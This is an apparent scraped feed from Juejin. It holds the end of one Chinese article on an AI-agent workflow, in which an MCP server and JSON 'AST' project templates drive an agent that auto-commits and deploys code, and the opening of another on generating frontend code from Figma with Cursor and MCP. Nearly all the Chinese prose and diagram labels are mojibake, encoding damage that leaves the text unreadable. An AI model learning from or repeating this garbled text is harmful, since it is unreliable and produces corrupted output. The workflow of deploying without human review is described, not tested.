    A[çº¿ä¸Šç³»ç»Ÿè¿è¡Œ] --&gt; B[çº¿ä¸Šé”™è¯¯ç›‘æ§]
    A --&gt; C[ç”¨æˆ·åé¦ˆ]

    D[æ¥å£æ–‡æ¡£]
    E[éœ€æ±‚æ–‡æ¡£]

    %% MCP æ¨¡å—
    B --&gt; M[MCP Server]
    C --&gt; M
    D --&gt; M
    E --&gt; M
    M --&gt; N[é¡¹ç›®åŸºå› AST&amp; AI_GUIDE.MD]
    N --&gt; F[AI Agent]
    F --&gt;|è‡ªåŠ¨åˆ†æä¸å†³ç­–| G[ç”Ÿæˆ / ä¿®æ”¹ä»£ç ]
    G --&gt;|è‡ªåŠ¨æäº¤| H[éƒ¨ç½²ä¸Šçº¿]

    H --&gt;|å½¢æˆé—­ç¯| A

    style M fill:#e3f2fd
    style F fill:#e1f5ff
    style G fill:#e1ffe1
    style H fill:#fff4e1
    style A fill:#ffe8e1
</code></pre>
<p><strong>è¿™ä¸ªæµç¨‹é‡Œå¢åŠ äº†æ ¸å¿ƒæ¨¡å—ASTï¼Œè§£å†³AIéœ€è¦å¤–éƒ¨è®°å¿†ç³»ç»Ÿçš„é—®é¢˜ã€‚åç»­é¡¹ç›®çš„è¿­ä»£ï¼Œå°±æˆäº†ä»¥ASTä½œä¸ºæ ¸å¿ƒåŸºå› ï¼Œè¿›è¡ŒåŸºå› è¡¨è¾¾å¼çš„æ¼”è¿›æµç¨‹</strong></p>
<p>ä¸Šé¢è¿™ä¸ªæ˜¯æœ€ä¸ºå…³é”®çš„ä¸€æ­¥ï¼Œåº”è¯¥ç®—æ˜¯ç‹¬åˆ›çš„æµç¨‹ï¼Œæ²¡è§è¿‡ç±»ä¼¼çš„ã€‚</p>
<p>è¿™é‡ŒASTå¯ä»¥ç†è§£ä¸ºé¡¹ç›®çŸ¥è¯†å›¾è°±Knowledge Graphï¼Œæ ¸å¿ƒå…ƒæ•°æ®ç­‰ç­‰ï¼Œä¸ªäººè¿˜æ˜¯å–œæ¬¢ç§°ä¸ºASTï¼Œå’ŒæŠ½è±¡è¯­æ³•æ ‘æ²¡å…³ç³»ã€‚</p>
<p>ASTçš„æ¨¡ç‰ˆæœ€åˆå‚è€ƒDSLé€‰æ‹©äº†yamlï¼Œå› ä¸ºè¿™ä¸ªä¸œè¥¿å¾ˆåƒæ˜¯å®¹å™¨é‡Œçš„DockerFile,ç›®æ ‡æ˜¯è®¾æƒ³æœ‰äº†è¿™ä¸ªåï¼Œä»£ç å¯ä»¥åƒå®¹å™¨ä¸€æ ·éšæ„åˆ é™¤ã€‚</p>
<p>åæ¥ä¾¿äºAIæ ¡éªŒå’Œè¯†åˆ«ï¼Œä»¥åŠä¾¿äºé˜…è¯»ï¼Œæ”¹ä¸ºjsonæ–‡ä»¶ã€‚</p>
<p>æˆ‘è¿™é‡Œå®šä¹‰äº†ä¸»è¦13ä¸ªåŸºç¡€æ¨¡ç‰ˆ,ç»†èŠ‚å°±ä¸å±•ç¤ºäº†ï¼Œä»…ä¾›å‚è€ƒï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-strong">**<span class="hljs-emphasis">_meta.ast.json** - ğŸ“Œ **å…¥å£æ–‡ä»¶**ï¼šé¡¹ç›®å…ƒä¿¡æ¯ã€æŠ€æœ¯æ ˆã€å›¢é˜Ÿã€æ¶æ„ï¼Œ**åŒ…å«æ‰€æœ‰ASTæ–‡ä»¶æ¸…å•**
**_</span>ast<span class="hljs-emphasis">_index.json** - ASTç´¢å¼•æ–‡ä»¶ï¼šå…¨å±€ç»Ÿè®¡å’Œå…³ç³»å›¾è°±ï¼ˆæœ€åç”Ÿæˆï¼‰
**api.ast.json** - APIæ¥å£å®šä¹‰ API æ¥å£ï¼ˆåŸºç¡€ä¿¡æ¯ï¼šid, name, method, path, params, responseï¼‰
**api.enhanced.ast.json** - APIå¢å¼ºå®šä¹‰ï¼ˆå«semanticsã€implementationHintsç­‰AIåˆ†æï¼‰
**config.ast.json** - é…ç½®ä¿¡æ¯ã€ç¯å¢ƒå˜é‡ã€æ„å»ºé…ç½®
**contexts.ast.json** - åº”ç”¨ä¸Šä¸‹æ–‡ï¼ˆè®¤è¯ã€ç¼“å­˜ã€æ•°æ®åº“è¿æ¥ç­‰ï¼‰
**domain.ast.json** - æ•°æ®æ¨¡å‹ã€å®ä½“ã€å­—æ®µã€å…³ç³»
**infrastructure.ast.json** - ä¸­é—´ä»¶ã€å·¥å…·å‡½æ•°ã€å…¬å…±æœåŠ¡
**permission.ast.json** - æƒé™å®šä¹‰ã€è§’è‰²ã€èµ„æºè®¿é—®æ§åˆ¶
**response-format.ast.json** - APIå“åº”æ ¼å¼æ ‡å‡†ã€é”™è¯¯ç å®šä¹‰
**ui-components.ast.json** - UIç»„ä»¶æŠ½è±¡å®šä¹‰ï¼ˆæ¡†æ¶æ— å…³ï¼‰
**ui.ast.json** - UIé¡µé¢ã€è·¯ç”±ã€å¸ƒå±€ç»“æ„
**workflow.ast.json** - ä¸šåŠ¡æµç¨‹ã€å·¥ä½œæµå®šä¹‰
</span></span></code></pre>
<h4 data-id="heading-4">3.2ã€ä¿¡æ¯æºé€ æˆçš„æ··ä¹±</h4>
<p><strong>å®é™…åœºæ™¯</strong>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Sentry</span>è¯´ï¼š<span class="hljs-title class_">User</span>.<span class="hljs-title function_">save</span>()æŠ¥é”™
<span class="hljs-title class_">Swagger</span>è¯´ï¼š<span class="hljs-variable constant_">POST</span> /useréœ€è¦emailå­—æ®µ
ç”¨æˆ·åé¦ˆè¯´ï¼šæ³¨å†Œåæ²¡æ”¶åˆ°é‚®ä»¶
è€ä»£ç è¯´ï¼š<span class="hljs-title class_">User</span>æ¨¡å‹æœ‰usernameå­—æ®µ

â†’ <span class="hljs-variable constant_">AI</span>æ•´åˆ<span class="hljs-number">4</span>ä¸ªä¿¡æ¯æºï¼Œç”Ÿæˆäº†<span class="hljs-string">"çœ‹ä¼¼æ­£ç¡®"</span>çš„ä»£ç 
â†’ å®é™…è¿è¡Œï¼šé€»è¾‘å†²çªï¼Œæ›´å¤š<span class="hljs-title class_">Bug</span>
</code></pre>
<p><strong>è§£å†³æ€è·¯</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[å¤šä¿¡æ¯æº] --&gt; B[Sentryé”™è¯¯]
    A --&gt; C[ç”¨æˆ·åé¦ˆ]
    A --&gt; D[Swaggeræ–‡æ¡£]
    A --&gt; E[ç°æœ‰ä»£ç ]
    
    B &amp; C &amp; D &amp; E --&gt;|AIæå–| F[ASTå…ƒæ•°æ®]
    F --&gt;|AIè‡ªåŠ¨åŒ–å®¡æ ¸| G{å®Œå¤‡æ€§æ£€æŸ¥}
    
    G --&gt;|62%| H[ç”Ÿæˆç¼ºå¤±æŠ¥å‘Š]
    H --&gt; I[è¯¦ç»†æ¸…å•:&lt;br/&gt;- 32ä¸ªå‚æ•°ç¼ºè¯´æ˜&lt;br/&gt;- 18ä¸ªç¼ºéªŒè¯è§„åˆ™]
    I --&gt;|è¡¥å……| F
    
    G --&gt;|&gt;95%| J[å”¯ä¸€å¯ä¿¡æº]
    J --&gt;|è‡ªåŠ¨ç”Ÿæˆ| K[ä»£ç ]
    J --&gt;|è‡ªåŠ¨ç”Ÿæˆ| L[æ–‡æ¡£]
    J --&gt;|è‡ªåŠ¨ç”Ÿæˆ| M[æµ‹è¯•]
    
    style F fill:#fff4e1
    style G fill:#ffe1f5
    style J fill:#e1ffe1
    style K fill:#e1f5ff
    style L fill:#e1f5ff
    style M fill:#e1f5ff
</code></pre>
<p>è¿™ä¸ªæµç¨‹å¢åŠ äº†æ ¸å¿ƒæ¨¡å—ï¼šASTå®Œå¤‡æ€§æ£€æŸ¥ï¼Œç”¨æ¥ç¡®è®¤æ•°æ®æ˜¯å¦å†²çªï¼Œæ˜¯å¦å®Œæ•´ï¼Œç­‰ç­‰ã€‚</p>
<h4 data-id="heading-5">3.3ã€æ— æ³•ä¿è¯ç”Ÿæˆç»“æœçš„ä¸€è‡´æ€§</h4>
<p><strong>å¤±è´¥æ¡ˆä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-diff" lang="diff">éœ€æ±‚ï¼šå®ç°Useræ³¨å†Œæ¥å£

AIç¬¬1æ¬¡ç”Ÿæˆï¼š
<span class="hljs-deletion">- POST /api/user/register</span>
<span class="hljs-deletion">- ä½¿ç”¨bcryptåŠ å¯†å¯†ç </span>
<span class="hljs-deletion">- è¿”å›JWT token</span>

AIç¬¬2æ¬¡ç”Ÿæˆï¼ˆåŒä¸€éœ€æ±‚ï¼‰ï¼š
<span class="hljs-deletion">- POST /api/v1/users</span>
<span class="hljs-deletion">- ä½¿ç”¨md5åŠ å¯†å¯†ç </span>
<span class="hljs-deletion">- è¿”å›session cookie</span>

AIç¬¬3æ¬¡ç”Ÿæˆï¼š
<span class="hljs-deletion">- POST /register</span>
<span class="hljs-deletion">- æ˜æ–‡å­˜å‚¨å¯†ç ï¼ˆï¼ï¼‰</span>
<span class="hljs-deletion">- è¿”å›user_id</span>

â†’ åŒä¸€éœ€æ±‚ï¼Œ3ç§å®Œå…¨ä¸åŒçš„å®ç°ï¼
</code></pre>
<p><strong>æ ¹æœ¬åŸå› </strong>ï¼š</p>
<ul>
<li>AIçš„ç”Ÿæˆè¿‡ç¨‹åŒ…å«éšæœºæ€§</li>
<li>ç¼ºä¹æ ‡å‡†åŒ–çº¦æŸ</li>
<li>æ²¡æœ‰ç¡®å®šæ€§ç”Ÿæˆæœºåˆ¶</li>
<li>æ²¡æœ‰æ˜ç¡®æŒ‡ç¤ºçš„ï¼ŒAIå°±ä¼šæ¼‚ç§»æ‘‡æ‘†ä¸å®š</li>
</ul>
<p><strong>è§£å†³æ€è·¯</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[ASTå®šä¹‰] --&gt;|æ ‡å‡†åŒ–| B[134ä¸ªé¢„å®šä¹‰åŠ¨ä½œ]
    B --&gt; C[ç¦æ­¢AIè‡ªåˆ›]
    
    A --&gt;|æ¨¡æ¿å¼•æ“| D[è‡ªå®šä¹‰æ¨¡æ¿]
    D --&gt;|å†³å®šæ€§ç”Ÿæˆ| E[ä»£ç è¾“å‡º]
    
    E --&gt;|10æ¬¡ç”Ÿæˆ| F[å“ˆå¸ŒéªŒè¯]
    F --&gt;|å®Œå…¨ä¸€è‡´| G[diff = 0]
    
    H[å¤±è´¥æ–¹æ¡ˆ] --&gt;|AIè‡ªç”±å‘æŒ¥| I[æ¯æ¬¡ä¸åŒ]
    
    style A fill:#fff4e1
    style B fill:#e1ffe1
    style G fill:#e1ffe1
    style I fill:#ffe1e1
</code></pre>
<p>åˆ°è¿™é‡Œå¤§å®¶å¯èƒ½ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œæ€ä¹ˆææ¨¡ç‰ˆäº†ï¼Œè¿™æ˜¯ä¸æ˜¯å˜æˆäº†ç±»ä¼¼â€˜ä½ä»£ç å¹³å°â€™JSON Schemaç±»ä¼¼çš„ä¸œè¥¿ï¼Œæ­å–œä½ çŒœå¯¹äº†ä¸€åŠï¼Œç»™ä½ ç‚¹ä¸ªğŸ‘ã€‚</p>
<p><strong>å…¶å®åˆ°è¿™ä¸€æ­¥ç¡®å®é‡åˆ°äº†åç¦»æœ€åˆè®¾æƒ³çš„é—®é¢˜</strong>ï¼š</p>
<p>æˆ‘ä»¬æƒ³è¦ï¼šæœ‰é™çš„åŸºå› AST + æ— é™åˆ¶çš„è¯­è¨€/æ¡†æ¶/åº“/å·¥å…· === å»å®ç°æœ‰é™çš„ç»“æœè¾“å‡ºã€‚</p>
<p>ä½†æ˜¯ï¼š 1+æ— é™=æ— é™ï¼Œ 1xæ— é™=æ— é™</p>
<p><strong>åœ¨è¿™ç§è¦æ±‚ä¸‹ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è¿­ä»£æµç¨‹ç­‰è¦ç´ ï¼Œæ— é™è¶‹è¿‘äº100%çš„å®ç°æœ‰é™å’Œä¸€è‡´çš„è¾“å‡ºï¼Œä½†æ˜¯å°±åƒåœ†å‘¨ç‡æ°¸è¿œç®—ä¸å°½ï¼Œæ°¸è¿œæ²¡æœ‰ç»å¯¹å…‰æ»‘çš„åœ†ï¼Œæˆ‘ä»¬ä¹Ÿåªèƒ½å®ç°æœ‰ä¸€å®šæ³¢åŠ¨çš„è¾“å‡ºã€‚</strong></p>
<p>è¿™ç§æ³¢åŠ¨å¹¶éæ²¡æœ‰æ„ä¹‰ï¼Œæ¯”å¦‚æˆ‘ä»¬ç”¨æ¥é‡æ„é¡¹ç›®æ—¶ï¼Œæ›´æ¢ä¸€ä¸‹æ¡†æ¶è¯­è¨€ï¼Œå‡çº§ä¸€ä¸‹ä¾èµ–å’Œè¿è¡Œç¯å¢ƒç‰ˆæœ¬ç­‰ï¼Œå®ç°ä¸€ä¸ª95%å®Œæˆç‡çš„é‡æ„é¡¹ç›®ï¼Œä¹Ÿæ˜¯å¾ˆæœ‰ä»·å€¼çš„ï¼Œå…·ä½“ä¸å†è¿‡å¤šè®¨è®ºã€‚</p>
<h4 data-id="heading-6">3.4ã€ç°æœ‰é¡¹ç›®çš„çŸ¥è¯†æµå¤±</h4>
<p><strong>çœŸå®æ¡ˆä¾‹</strong>ï¼š</p>
<pre><code class="hljs">æ ¸å¿ƒå¼€å‘äººå‘˜ç¦»èŒ 
  â†“
ä¸šåŠ¡é€»è¾‘æ•£è½åœ¨ä»£ç ä¸­ï¼Œéš¾ä»¥ç†è§£
  â†“
æ–‡æ¡£ç¼ºå¤±æˆ–å·²è¿‡æ—¶
  â†“
æ–°äººä¸Šæ‰‹éœ€è¦2-3å‘¨ï¼Œé¢‘ç¹è¸©å‘
  â†“
ç»´æŠ¤æˆæœ¬è¶Šæ¥è¶Šé«˜ï¼Œä¸æ•¢é‡æ„
</code></pre>
<p><strong>æ ¹æœ¬åŸå› </strong>ï¼š</p>
<ul>
<li>ä¸šåŠ¡é€»è¾‘éšè—åœ¨ä»£ç å®ç°ç»†èŠ‚ä¸­</li>
<li>æ–‡æ¡£ä¸ä»£ç åˆ†ç¦»ï¼Œå®¹æ˜“ä¸åŒæ­¥</li>
<li>ç¼ºä¹ç»“æ„åŒ–çš„çŸ¥è¯†æ²‰æ·€æœºåˆ¶</li>
<li>é¡¹ç›®çŸ¥è¯†éšäººå‘˜æµå¤±è€Œæ¶ˆå¤±</li>
</ul>
<p><strong>è§£å†³æ€è·¯ï¼ˆåå‘æå–ï¼‰</strong></p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[ç°æœ‰æºç é¡¹ç›®] --&gt;|AIåˆ†ææå–| B[ASTå…ƒæ•°æ®]
    
    B --&gt; C[13ç±»ç»“æ„åŒ–çŸ¥è¯†]
    
    C --&gt; C1[APIå®šä¹‰]
    C --&gt; C2[æ•°æ®æ¨¡å‹]
    C --&gt; C3[ä¸šåŠ¡æµç¨‹]
    C --&gt; C4[æƒé™è§„åˆ™]
    C --&gt; C5[UIç»„ä»¶]
    C --&gt; C6[é…ç½®é¡¹]
    
    C1 --&gt;|è‡ªåŠ¨ç”Ÿæˆ| E[APIæ–‡æ¡£]
    C2 --&gt;|è‡ªåŠ¨ç”Ÿæˆ| F[ERå›¾]
    C3 --&gt;|è‡ªåŠ¨ç”Ÿæˆ| G[æµç¨‹å›¾]
    B --&gt;|è‡ªåŠ¨ç”Ÿæˆ| H[æ¶æ„å›¾]
    C4 --&gt;|è‡ªåŠ¨ç”Ÿæˆ| I[æƒé™çŸ©é˜µ]
    
    E &amp; F &amp; G &amp; H &amp; I &amp; C --&gt;|ç»¼åˆç”Ÿæˆ| D[é¡¹ç›®æ¥æ‰‹æŒ‡å—]
    D --&gt; D1[æ¶æ„å›¾]
    D --&gt; D2[APIåˆ—è¡¨]
    D --&gt; D3[ERå›¾]
    D --&gt; D4[ä¸šåŠ¡æµç¨‹å›¾]
    D --&gt; D5[æƒé™æ¨¡å—]
    D --&gt; D6[æºç æ ¸å¿ƒæ‘˜è¦]
    D --&gt; D7[å¼€å‘æµç¨‹/æ³¨æ„äº‹é¡¹]
    
    B --&gt;|å¯è¿½æº¯| J[æºç ä½ç½®è®°å½•]
    J --&gt; K[æ–‡ä»¶è·¯å¾„+è¡Œå·]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style D fill:#e1ffe1
    style E fill:#e1ffe1
    style F fill:#e1ffe1
    style G fill:#e1ffe1
    style H fill:#e1ffe1
    style I fill:#e1ffe1
    style K fill:#ffe8e1
</code></pre>
<p>è¿™ä¸ªæµç¨‹å…¶å®åªæ˜¯å¢åŠ äº†ä¸€äº›æ–‡æ¡£ï¼š
PROCESS_PROJECT_ONBOARDING_DOC_GENERATION.mdï¼Œç”¨äºç”Ÿæˆé¡¹ç›®ä½¿ç”¨æŒ‡å—ã€‚
AI_GUIDE_V2.md ï¼Œè¿­ä»£åçš„AIæŒ‡å¼•å…¥å£æ–‡æ¡£ï¼Œç”¨äºè®©AIå‚è€ƒæŒ‡å®šçš„æ–‡ä»¶åˆ†æ­¥æ‰§è¡Œæµç¨‹ã€‚</p>
<h3 data-id="heading-7">æ€»ç»“</h3>
<p>å…¶å®è¿˜æœ‰å¾ˆå¤šç»†èŠ‚ã€‚</p>
<p>æ¯”å¦‚ï¼šå¦‚ä½•è¿›è¡ŒAIæµç¨‹å¼€å‘çš„è°ƒè¯•å·¥ä½œï¼Œå¦‚ä½•ç”ŸæˆAIä¿®æ”¹æŠ¥å‘Šç­‰ï¼Œç½‘ä¸Šä¹Ÿèƒ½æœåˆ°ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p>
<p>ä»¥ä¸Šå°±æ˜¯ä¸ªäººæ€»ç»“çš„ä¸€äº›æ€è·¯ï¼Œå¸Œæœ›å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©ã€‚</p>
<p>å†™æ–‡ç« å¤ªç—›è‹¦äº†ï¼Œæœ‰ç”¨çš„è¯ç‚¹ä¸ªèµï¼Œæ˜é‡‘çš„mermaidå›¾è²Œä¼¼ç‰ˆæœ¬æœ‰ç‚¹ä½ï¼Ÿåé¢è¯¥ç”»å›¾çš„æˆ‘éƒ½çœäº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Cursorè¿›é˜¶å®æˆ˜Â·01ã€‘Figmaè®¾è®¡ç¨¿ä¸€é”®è¿˜åŸï¼šCursor + MCPè®©å‰ç«¯å¼€å‘æé€Ÿ10å€]]></title>    <link>https://juejin.cn/post/7589093939656687668</link>    <guid>https://juejin.cn/post/7589093939656687668</guid>    <pubDate>2025-12-29T12:54:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589093939656687668" data-draft-id="7589093939656654900" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Cursorè¿›é˜¶å®æˆ˜Â·01ã€‘Figmaè®¾è®¡ç¨¿ä¸€é”®è¿˜åŸï¼šCursor + MCPè®©å‰ç«¯å¼€å‘æé€Ÿ10å€"/> <meta itemprop="keywords" content="Cursor,MCP,LLM"/> <meta itemprop="datePublished" content="2025-12-29T12:54:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Cursorè¿›é˜¶å®æˆ˜Â·01ã€‘Figmaè®¾è®¡ç¨¿ä¸€é”®è¿˜åŸï¼šCursor + MCPè®©å‰ç«¯å¼€å‘æé€Ÿ10å€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T12:54:12.000Z" title="Mon Dec 29 2025 12:54:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å†™åœ¨å‰é¢</h2>
<p>è¿˜è®°å¾—ç¬¬ä¸€æ¬¡æ‹¿åˆ°è®¾è®¡å¸ˆçš„Figmaé“¾æ¥æ—¶çš„å¿ƒæƒ…å—ï¼Ÿå…´å¥‹ä¸­å¸¦ç€ä¸€ä¸ææƒ§â€”â€”"è¿™ä¹ˆç²¾ç¾çš„è®¾è®¡ï¼Œæˆ‘èƒ½è¿˜åŸåˆ°90%å°±ä¸é”™äº†"ã€‚ç„¶åå¼€å§‹æ¼«é•¿çš„æµ‹é‡ä¹‹æ—…ï¼š</p>
<ul>
<li>ğŸ” å³é”®æ£€æŸ¥é—´è·ï¼š"<code>padding: 24px</code>...ä¸å¯¹ï¼Œè®¾è®¡ç¨¿æ˜¯25px"</li>
<li>ğŸ¨ å¸å–é¢œè‰²ï¼š"<code>#3B82F6</code>...å’¦ï¼Œå’Œè®¾è®¡ç¨¿çš„<code>#3B82F5</code>å·®äº†ä¸€ä¸ªè‰²å·"</li>
<li>ğŸ“ æµ‹é‡å­—å·ï¼š"<code>font-size: 16px</code>...è¡Œé«˜å¤šå°‘æ¥ç€ï¼Ÿ"</li>
</ul>
<p>ä¸¤å¤©åï¼Œç»ˆäºå®Œæˆã€‚è®¾è®¡å¸ˆçœ‹äº†ä¸€çœ¼ï¼š"å—¯...èƒ½ä¸èƒ½æŠŠè¿™ä¸ªé—´è·å†è°ƒå°2pxï¼Ÿ"</p>
<p>æˆ‘ï¼šğŸ’¢</p>
<p><strong>å¦‚æœæˆ‘å‘Šè¯‰ä½ ï¼Œè¿™ä¸€åˆ‡å¯ä»¥è‡ªåŠ¨åŒ–å‘¢ï¼Ÿ</strong></p>
<p>ä»Šå¤©è¿™ç¯‡æ–‡ç« ï¼Œæˆ‘å°†å±•ç¤ºå¦‚ä½•ç”¨ <strong>Cursor + MCP</strong> æŠ€æœ¯ï¼Œè®©AIç›´æ¥è¯»å–Figmaè®¾è®¡å…ƒæ•°æ®ï¼Œè‡ªåŠ¨ç”Ÿæˆä»£ç ã€‚å¼€å‘æ•ˆç‡æå‡10å€ï¼Œä»£ç è´¨é‡æ›´é«˜ï¼Œè®¾è®¡å˜æ›´ç§’çº§åŒæ­¥ã€‚</p>
<p>è¿™æ˜¯ã€ŠCursorè¿›é˜¶å®æˆ˜ã€‹ç³»åˆ—çš„ç¬¬ä¸€ç¯‡ï¼Œæˆ‘ä¼šç”¨æœ€æ¥åœ°æ°”çš„æ–¹å¼ï¼Œå¸¦ä½ ä»0åˆ°1æŒæ¡è¿™ä¸ª"é»‘ç§‘æŠ€"ã€‚</p>
<h2 data-id="heading-1">ä¼ ç»Ÿæµç¨‹ vs AIé©±åŠ¨æµç¨‹</h2>
<p>è®©æˆ‘ä»¬å…ˆç›´è§‚æ„Ÿå—ä¸€ä¸‹å·®å¼‚ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/347429796bab429ba4af6abc3159aada~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767617652&amp;x-signature=oN8EtwP17Nu4MM8Evan7dA8XeoY%3D" alt="cursor01-è®¾è®¡ç¨¿è¿˜åŸæµç¨‹å¯¹æ¯”å›¾.png" loading="lazy"/></p>
